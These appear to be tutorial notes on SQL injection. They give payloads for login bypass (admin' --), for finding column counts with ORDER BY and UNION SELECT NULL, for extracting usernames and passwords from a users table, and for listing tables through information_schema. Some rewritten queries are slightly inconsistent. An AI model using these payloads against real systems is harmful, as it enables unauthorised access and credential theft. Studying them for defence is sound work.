# SQL Injection — Notes & Concepts

---

## 1. What is SQL Injection?

SQL Injection is a vulnerability that allows an attacker to interfere with the queries an application sends to its database. This can lead to unauthorized data access or manipulation.

---

## 2. Web Application Architecture

Web applications usually have **three layers**:

- **Presentation Layer**: The user interface, e.g., the browser.  
- **Logic Layer**: The backend code that processes requests.  
- **Storage Layer**: The database storing data, e.g., MySQL, MSSQL.

### How They Interact

When a user applies a filter (e.g., price = $50):

1. The browser sends a request to the backend.  
2. The backend generates a SQL query to retrieve filtered data.  
3. The database returns the result to the backend, which sends it back to the browser.

---

## 3. Four-Layer Architecture (Modern)

Sometimes, an additional **API layer** is added between Logic and Storage to expose business logic securely and improve scalability.

---

## 4. Detecting SQL Injection

- Using single quotes `'` to test for errors.  
- Boolean conditions like `OR 1=1` or `OR 1=2` in inputs.  
- Injection can occur in `SELECT`, `UPDATE`, `INSERT`, and `ORDER BY` SQL statements.

---

## 5. Example: How SQL Works with User Input

URL:  
https://giftswebsite.com/products?price=100

Corresponding SQL query:  
```sql
SELECT * FROM products WHERE price = 100 AND released = 1;
```

Injection Example
URL:

https://giftswebsite.com/products?price=100'--

Becomes:

```sql
SELECT * FROM products WHERE price = 100'--' AND released = 1;
```
The -- comments out the rest of the query, bypassing the original filter.

OR-based Injection

URL:

https://giftswebsite.com/products?price=100' OR 1=1--

Query:

```sql
SELECT * FROM products WHERE price = 100 OR 1=1-- AND released = 1;
```

This always returns true and exposes all data.

---

## 6. Subverting Application Logic

By injecting SQL into login forms, attackers can bypass authentication:

Example input:

Username: admin' --

Password: (blank)

Query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```

Password check is ignored.
Hence its by passed.

---

## 🔓 SQL Injection – UNION Attack

🎯 What is UNION in SQL?

The UNION operator allows combining results from two or more SELECT queries into a single result set.

```sql
SELECT a, b FROM table1
UNION
SELECT c, d FROM table2
```
Result: Two columns, merged rows from both SELECT statements.

Conditions:

- Same number of columns in both queries.

- Compatible data types between corresponding columns.

---

## 🔍 Determining the Number of Columns

Two main techniques:

1. ORDER BY Injection

Gradually increase the column index:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
```

When the index exceeds the number of columns, the server returns an error (e.g., “ORDER BY position 4 is out of range”).

This helps identify the total number of columns.

2. UNION SELECT NULL

Try increasing NULL values until the query works:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
...
````

If it works with 3 NULLs, then 3 columns are returned by the original query.

NULL is type-flexible, so it's the safest value to test with.

---

## 🧠 Finding Columns That Accept Strings

Once the correct column count is known, inject strings to find displayable columns:
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
````
Whichever payload reflects 'a' back confirms which column is rendered in the output.

This is crucial to display useful data like usernames, emails, passwords, etc.

---

## 💥 Retrieving Sensitive Data

After knowing:

- Number of columns

- Which column outputs data

You can extract data from other tables like users:

```sql
' UNION SELECT username, password, NULL FROM users--
(Assuming 3 columns total and 3rd isn’t displayed)
```
---

## Using a SQL Injection UNION Attack to Retrieve Data

You can retrieve the contents of a table, such as the users table, by submitting an input like:
```sql
' UNION SELECT username, password FROM users--+
```
---

## Retrieving Multiple Values Within a Single Column

To return multiple values concatenated into a single column, use the concatenation operator:

```sql
' UNION SELECT username || '~' || password FROM users--+
```

- Here, || is the concatenation operator in SQL (PostgreSQL), and '~' is used as a separator between values.

- Always identify the number of columns expected by the original query when using UNION.

---

## Examining the Database in SQL Injection Attacks

When analyzing the database for SQL injection, two key points are essential:

- Identify the database version

- Determine the number of columns in the original query

To identify the database version, use:
```sql
' UNION SELECT @@version--+
```

To identify the number of columns, use queries like:
```sql
' ORDER BY 1--+
' ORDER BY 2--+
...
or try UNION SELECT with different numbers of columns until the query works without error.
```

## SQL Injection Comment Syntax Note

- SQL comments start with -- (double hyphen), which tells the SQL engine to ignore the rest of the line.

- Important: -- must be followed by a space or control character to work properly; otherwise, it may cause syntax errors.

Why Use --+ Instead of Just --

In URLs, spaces are encoded as %20 or sometimes represented as +.

Using --+ ensures the server decodes it as -- (double hyphen plus space).

This guarantees the rest of the original query is properly commented out and the injection works reliably.

```sql
' UNION SELECT username, password FROM users--+
```
---

## Listing Database Contents

To enumerate tables in the database, query the information_schema.tables view:

```sql
' UNION SELECT NULL, table_name FROM information_schema.tables--+
```

To list columns for a specific table, query information_schema.columns:
```sql
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users'--+
```

Use table_name for filtering tables and column_name for columns.

